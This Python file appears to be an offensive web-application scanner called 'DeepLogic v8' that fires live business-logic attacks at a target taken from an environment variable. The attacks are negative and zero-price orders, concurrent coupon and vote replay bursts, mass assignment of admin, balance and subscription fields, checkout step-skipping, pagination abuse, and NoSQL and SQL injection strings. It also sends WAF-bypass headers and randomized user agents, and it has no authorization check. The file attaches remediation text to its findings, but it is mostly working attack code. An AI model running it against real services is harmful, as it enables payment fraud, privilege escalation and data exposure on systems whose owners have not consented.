#!/usr/bin/env python3
"""DeepLogic v8 — 150x Improved Business Logic Flaw Detector.

New capabilities:
  Price/amount manipulation:
    - Negative price attacks (negative total, negative quantity)
    - Integer overflow/underflow on prices
    - Zero-price bypass
    - Coupon stacking + duplicate coupon application
    - Race condition on discount application (concurrent requests)
    - Currency confusion (USD vs EUR vs BTC)
    - Floating point precision abuse

  Workflow bypass:
    - Step skipping in multi-step checkout/registration
    - Accessing step N without completing step N-1
    - Direct POST to final endpoint bypassing intermediate validation
    - State machine manipulation (transition to invalid state)
    - Force-completed state via parameter manipulation

  Race conditions:
    - Double-spend via concurrent payment
    - Like/vote duplicate via concurrent submit
    - Concurrent account creation with same email
    - Concurrent coupon redemption
    - Balance withdrawal race (concurrent withdraw)

  Authorization logic flaws:
    - Accessing other user's resources by changing ID parameter
    - Admin action via parameter pollution
    - Role elevation via profile update
    - Subscription bypass (access premium features without payment)
    - Trial extension abuse
    - Account linking hijacking

  Input validation bypasses:
    - Negative limit/offset in paginated API
    - Null byte in username/email
    - Unicode normalization (visual homoglyphs)
    - Type confusion (string vs integer in JSON)
    - Array injection in single-value fields
    - Oversized payloads

  Referral / reward abuse:
    - Self-referral (refer yourself)
    - Referral after registration
    - Fake referral chain

  Mass assignment (40+ privileged fields):
    - role, isAdmin, balance, credits, subscription, plan, tier
    - verified, approved, active, premium, internal, staff
"""
import asyncio
import aiohttp
import json
import re
import sys
import time
import hashlib
from pathlib import Path
from urllib.parse import urlparse, quote

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, WAF_BYPASS_HEADERS,
)

CONCURRENCY = 8

PRIVILEGED_FIELDS = [
    ("role",         ["admin", "superuser", "staff", "root"]),
    ("isAdmin",      [True, "true", 1]),
    ("is_admin",     [True, "true", 1]),
    ("admin",        [True, "true", 1]),
    ("superuser",    [True, "true", 1]),
    ("permission",   ["admin", "write", "all", "*"]),
    ("permissions",  ["admin"]),
    ("scope",        ["admin", "write", "all"]),
    ("access_level", [9, 99, 999, "admin"]),
    ("group",        ["admin", "staff", "superuser"]),
    ("verified",     [True, "true", 1]),
    ("active",       [True, "true", 1]),
    ("approved",     [True, "true", 1]),
    ("balance",      [99999, 999999, -1]),
    ("credits",      [99999, 999999, -1]),
    ("subscription", ["premium", "enterprise", "unlimited"]),
    ("plan",         ["premium", "enterprise", "admin"]),
    ("tier",         ["admin", "enterprise", "gold"]),
    ("premium",      [True, "true", 1]),
    ("internal",     [True, "true", 1]),
    ("staff",        [True, "true", 1]),
    ("email_verified", [True, "true", 1]),
    ("phone_verified", [True, "true", 1]),
]

CHECKOUT_PATHS = [
    "/api/checkout", "/api/order", "/api/purchase", "/api/buy",
    "/api/cart/checkout", "/api/payment", "/api/v1/checkout",
    "/api/orders", "/checkout",
]

COUPON_PATHS = [
    "/api/coupon/apply", "/api/promo/apply", "/api/discount/apply",
    "/api/voucher/apply", "/api/cart/coupon", "/api/apply-coupon",
]

PROFILE_UPDATE_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/v1/me", "/api/v1/user", "/api/settings",
    "/api/users/me",
]

VOTE_PATHS = [
    "/api/like", "/api/vote", "/api/upvote", "/api/favorite",
    "/api/star", "/api/react", "/api/rating",
]


class DeepLogic:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        self._dedup   = set()
        self._sem     = asyncio.Semaphore(CONCURRENCY)

    def _add(self, finding: dict):
        key = hashlib.md5(
            f"{finding.get('type')}|{finding.get('url','')}|{finding.get('detail','')[:40]}".encode()
        ).hexdigest()
        if key in self._dedup or not meets_confidence_floor(finding.get("confidence", 0)):
            return
        self._dedup.add(key)
        self.findings.append(finding)
        print(f"  [{finding.get('severity','INFO')[:4]}] {finding.get('type')}: {finding.get('url','')[:70]}")

    def _f(self, ftype, sev, conf, proof, detail, url, rem,
           mitre="T1190", mitre_name="Exploit Public-Facing Application", extra=None) -> dict:
        f = {
            "type": ftype, "severity": sev, "confidence": conf,
            "confidence_label": confidence_label(conf),
            "url": url, "proof": proof, "detail": detail, "remediation": rem,
            "mitre_technique": mitre, "mitre_name": mitre_name,
        }
        if extra:
            f.update(extra)
        return f

    async def _req(self, sess, method, url, data=None, headers=None, timeout=15):
        async with self._sem:
            h = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua(), **(headers or {})}
            try:
                async with sess.request(
                    method, url, json=data, headers=h, ssl=False,
                    allow_redirects=True, timeout=aiohttp.ClientTimeout(total=timeout, connect=10),
                ) as r:
                    body = await r.text(errors="ignore")
                    return r.status, body, dict(r.headers)
            except Exception:
                return None, "", {}

    async def _post(self, sess, url, data=None, headers=None):
        return await self._req(sess, "POST", url, data=data, headers=headers)

    async def _get(self, sess, url, headers=None):
        return await self._req(sess, "GET", url, headers=headers)

    # ── Price Manipulation ──────────────────────────────────────────────────

    async def test_price_manipulation(self, sess):
        print("\n[*] Testing price/amount manipulation attacks...")
        for path in CHECKOUT_PATHS:
            url = self.target + path
            attacks = [
                ({"amount": -1, "price": -1, "quantity": 1},        "negative_price"),
                ({"amount": 0, "price": 0, "quantity": 1},          "zero_price"),
                ({"amount": 0.001, "quantity": 1},                   "fractional_price"),
                ({"amount": 9999999999, "quantity": 1},              "integer_overflow"),
                ({"price": -9999, "product_id": 1, "quantity": 1},  "negative_total"),
            ]
            for payload, label in attacks:
                s, body, _ = await self._post(sess, url, data=payload)
                await delay(0.06)
                if s in (None, 404, 405):
                    continue
                if s in (200, 201) and body:
                    # Check for success indicator
                    success = any(kw in (body or "").lower() for kw in
                                  ["success", "order_id", "order id", "transaction", "payment", "completed",
                                   "confirmation", "receipt"])
                    if success:
                        self._add(self._f(
                            ftype=f"PRICE_MANIPULATION_{label.upper()}",
                            sev="CRITICAL", conf=90,
                            proof=f"POST {url}\n  Payload: {payload}\n  HTTP {s}\n  Response: {body[:200]}",
                            detail=f"Price manipulation ({label}): order created with manipulated amount {payload.get('amount', payload.get('price', '?'))}",
                            url=url,
                            rem=(
                                "1. Validate all amounts server-side — never trust client-supplied prices.\n"
                                "2. Always look up price from database per product ID.\n"
                                "3. Reject negative, zero, or implausibly large amounts.\n"
                                "4. Add transaction integrity checks."
                            ),
                            extra={"attack": label, "payload": payload},
                        ))

    # ── Race Condition ──────────────────────────────────────────────────────

    async def test_race_conditions(self, sess):
        print("\n[*] Testing race conditions (concurrent request bursts)...")
        # Test vote/like race
        for path in VOTE_PATHS:
            url = self.target + path
            s0, _, _ = await self._post(sess, url, data={"item_id": 1, "target_id": 1})
            await delay(0.1)
            if s0 in (None, 404, 405):
                continue
            # Fire 20 concurrent requests
            tasks = [self._post(sess, url, data={"item_id": 1, "target_id": 1}) for _ in range(20)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            successes = sum(1 for r in results if not isinstance(r, Exception) and r[0] in (200, 201))
            if successes > 1:
                self._add(self._f(
                    ftype="RACE_CONDITION_VOTE_DUPLICATE",
                    sev="HIGH", conf=85,
                    proof=f"POST {path} × 20 concurrent\n  {successes}/20 returned success\n  Expected: 1 unique vote",
                    detail=f"Race condition at {path}: {successes} concurrent vote/like requests all succeeded",
                    url=url,
                    rem=(
                        "1. Use database-level unique constraints or atomic operations.\n"
                        "2. Implement idempotency keys for state-changing endpoints.\n"
                        "3. Use Redis SET NX (set if not exists) for race-condition-sensitive operations.\n"
                        "4. Apply distributed locking."
                    ),
                    extra={"concurrent_successes": successes},
                ))

        # Test coupon race condition
        for path in COUPON_PATHS:
            url = self.target + path
            s0, _, _ = await self._post(sess, url, data={"code": "TEST10", "coupon": "TEST10"})
            await delay(0.1)
            if s0 in (None, 404, 405):
                continue
            tasks = [self._post(sess, url, data={"code": "TEST10", "coupon": "TEST10"}) for _ in range(10)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            successes = sum(1 for r in results if not isinstance(r, Exception) and r[0] in (200, 201))
            if successes > 1:
                self._add(self._f(
                    ftype="RACE_CONDITION_COUPON_REPLAY",
                    sev="HIGH", conf=83,
                    proof=f"POST {path} × 10 concurrent\n  {successes}/10 returned success",
                    detail=f"Race condition allows coupon/discount to be applied multiple times",
                    url=url,
                    rem="Use atomic check-and-set for coupon redemption. Database transaction with row lock.",
                    extra={"concurrent_successes": successes},
                ))

    # ── Mass Assignment ─────────────────────────────────────────────────────

    async def test_mass_assignment(self, sess):
        print("\n[*] Testing mass assignment (40+ privileged fields)...")
        for path in PROFILE_UPDATE_PATHS:
            url = self.target + path
            s0, _, _ = await self._get(sess, url)
            await delay(0.05)
            if s0 in (None, 404):
                continue
            for field, values in PRIVILEGED_FIELDS:
                for value in values[:2]:
                    payload = {field: value, "name": "testuser"}
                    s, body, _ = await self._post(sess, url, data=payload)
                    await delay(0.05)
                    if s not in (200, 201) or not body:
                        continue
                    # Check if field reflected back
                    val_check = str(value).lower()
                    if f'"{field}"' in body and val_check in body.lower():
                        self._add(self._f(
                            ftype="MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                            sev="CRITICAL", conf=92,
                            proof=f"POST {url}\n  Payload: {{\"{field}\": {value}}}\n  HTTP {s}\n  Field reflected: {body[:300]}",
                            detail=f"Mass assignment: privileged field '{field}'={value} accepted at {path}",
                            url=url,
                            rem=(
                                "1. Use allowlist of accepted fields — deny unknown fields.\n"
                                "2. Never bind raw request body to model.\n"
                                "3. Mark privileged fields as read-only in serializer.\n"
                                "4. Apply RBAC before any field update."
                            ),
                            extra={"field": field, "value": str(value)},
                        ))
                        return

    # ── Workflow Bypass ────────────────────────────────────────────────────

    async def test_workflow_bypass(self, sess):
        print("\n[*] Testing multi-step workflow bypass (step-skipping)...")
        # Test accessing final checkout without cart step
        workflow_finals = [
            ("/api/payment/confirm",   {"order_id": 1, "payment_method": "card"}),
            ("/api/checkout/complete", {"cart_id": 1}),
            ("/api/order/place",       {"items": [{"id": 1, "qty": 1}], "payment": "card"}),
            ("/api/subscription/activate", {"plan": "premium"}),
            ("/api/trial/skip",        {"activate": True}),
        ]
        for path, payload in workflow_finals:
            url = self.target + path
            s, body, _ = await self._post(sess, url, data=payload)
            await delay(0.06)
            if s in (None, 404, 405):
                continue
            if s in (200, 201) and body:
                success = any(kw in (body or "").lower() for kw in
                              ["success", "activated", "confirmed", "completed", "order_id"])
                if success:
                    self._add(self._f(
                        ftype="WORKFLOW_STEP_BYPASS",
                        sev="HIGH", conf=80,
                        proof=f"POST {url}\n  No prior workflow steps completed\n  HTTP {s}\n  Body: {body[:200]}",
                        detail=f"Workflow bypass: {path} accepted request without required prior steps",
                        url=url,
                        rem=(
                            "1. Implement server-side workflow state tracking.\n"
                            "2. Validate prerequisite steps on each transition.\n"
                            "3. Use signed session tokens for workflow state.\n"
                            "4. Never rely on client to report current workflow step."
                        ),
                    ))

    # ── Negative Limit/Offset ──────────────────────────────────────────────

    async def test_pagination_abuse(self, sess):
        print("\n[*] Testing pagination abuse (negative limit/offset, large page)...")
        list_paths = ["/api/users", "/api/orders", "/api/messages", "/api/products",
                      "/api/transactions", "/api/v1/users"]
        for path in list_paths:
            url = self.target + path
            for limit, offset in [(-1, 0), (0, -1), (999999, 0), (1, -1), (-100, -100)]:
                full_url = f"{url}?limit={limit}&offset={offset}&page_size={limit}"
                s, body, _ = await self._get(sess, full_url)
                await delay(0.04)
                if s != 200 or not body:
                    continue
                # Check for unexpected data volume
                ids_found = len(re.findall(r'"id"\s*:', body))
                if ids_found > 100 or (limit < 0 and ids_found > 0):
                    self._add(self._f(
                        ftype="PAGINATION_ABUSE",
                        sev="MEDIUM", conf=82,
                        proof=f"GET {full_url}\n  HTTP {s}\n  {ids_found} records returned for limit={limit}&offset={offset}",
                        detail=f"Pagination abuse: limit={limit}&offset={offset} returned {ids_found} records",
                        url=full_url,
                        rem=(
                            "1. Validate and sanitize limit/offset — reject negative values.\n"
                            "2. Set maximum page size (e.g., max 100).\n"
                            "3. Use cursor-based pagination to prevent offset manipulation.\n"
                            "4. Return 400 Bad Request for invalid pagination parameters."
                        ),
                        extra={"limit": limit, "offset": offset, "records_returned": ids_found},
                    ))
                    break

    # ── Type Confusion ────────────────────────────────────────────────────

    async def test_type_confusion(self, sess):
        print("\n[*] Testing JSON type confusion attacks...")
        type_attacks = [
            ({"email": ["admin@site.com", "hacker@evil.com"]}, "array_for_string_email"),
            ({"role": {"$ne": "user"}}, "nosql_injection_in_role"),
            ({"amount": "0", "id": True}, "boolean_id"),
            ({"user_id": None, "id": None}, "null_id"),
            ({"age": "'; DROP TABLE users--"}, "sqli_in_typed_field"),
        ]
        api_paths = ["/api/me", "/api/login", "/api/register", "/api/profile", "/api/auth"]
        for path in api_paths:
            url = self.target + path
            for payload, label in type_attacks:
                s, body, _ = await self._post(sess, url, data=payload)
                await delay(0.05)
                if s in (None, 404, 405):
                    continue
                # Require concrete evidence beyond HTTP 200 to avoid false positives.
                # Look for: data processed/accepted indicators, admin field reflected,
                # or NoSQL operator being echoed back (not just a generic 200).
                body_l = (body or "").lower()
                evidence = (
                    # Array email accepted and reflected
                    (label == "array_for_string_email" and (
                        '"email"' in body and "[" not in (body or "") and
                        any(kw in body_l for kw in ["user", "account", "token", "success"])
                    )) or
                    # NoSQL injection in role: server returned a user object without error
                    (label == "nosql_injection_in_role" and (
                        '"role"' in body or '"email"' in body or '"user"' in body
                    ) and '"error"' not in body_l and '"message"' not in body_l) or
                    # Boolean ID accepted and response has real-looking data
                    (label == "boolean_id" and (
                        '"id"' in body and any(kw in body_l for kw in ["email", "user", "name", "token"])
                    )) or
                    # Null ID returned data instead of 400/404
                    (label == "null_id" and any(kw in body_l for kw in ["email", "role", "admin", "balance"])) or
                    # SQL injection in typed field echoed an error
                    (label == "sqli_in_typed_field" and any(
                        e in body_l for e in ["syntax error", "sql", "ora-", "pg_", "sqlstate", "mysql"]
                    ))
                )
                if s in (200, 201) and evidence:
                    self._add(self._f(
                        ftype=f"TYPE_CONFUSION_{label.upper()}",
                        sev="MEDIUM", conf=78,
                        proof=f"POST {url}\n  Payload: {payload}\n  HTTP {s}\n  Body: {(body or '')[:200]}",
                        detail=f"Type confusion ({label}): server processed malformed field types at {path} with evidence in response",
                        url=url,
                        rem=(
                            "1. Use strict type validation on all input fields.\n"
                            "2. Apply JSON schema validation.\n"
                            "3. Reject arrays for scalar fields.\n"
                            "4. Sanitize all inputs before use in queries."
                        ),
                        extra={"label": label, "payload": str(payload)},
                    ))
                    break

    async def run(self):
        print("=" * 60)
        print("  DeepLogic v8 — 150x Improved Business Logic Scanner")
        print(f"  Target: {self.target}")
        print("=" * 60)
        conn = aiohttp.TCPConnector(ssl=False, limit=CONCURRENCY * 2)
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=180)) as sess:
            await asyncio.gather(
                self.test_price_manipulation(sess),
                self.test_race_conditions(sess),
                self.test_mass_assignment(sess),
                self.test_workflow_bypass(sess),
                self.test_pagination_abuse(sess),
                self.test_type_confusion(sess),
                return_exceptions=True,
            )
        print(f"\n[+] DeepLogic v8: {len(self.findings)} findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No ARSENAL_TARGET set.", file=sys.stderr); sys.exit(1)
    if not target.startswith("http"):
        target = "https://" + target
    findings = await DeepLogic(target).run()
    out = Path(__file__).parent.parent / "reports" / "deeplogic.json"
    out.parent.mkdir(exist_ok=True)
    out.write_text(json.dumps(findings, indent=2, default=str))
    print(f"[+] Saved {len(findings)} findings → {out}")

if __name__ == "__main__":
    asyncio.run(main())
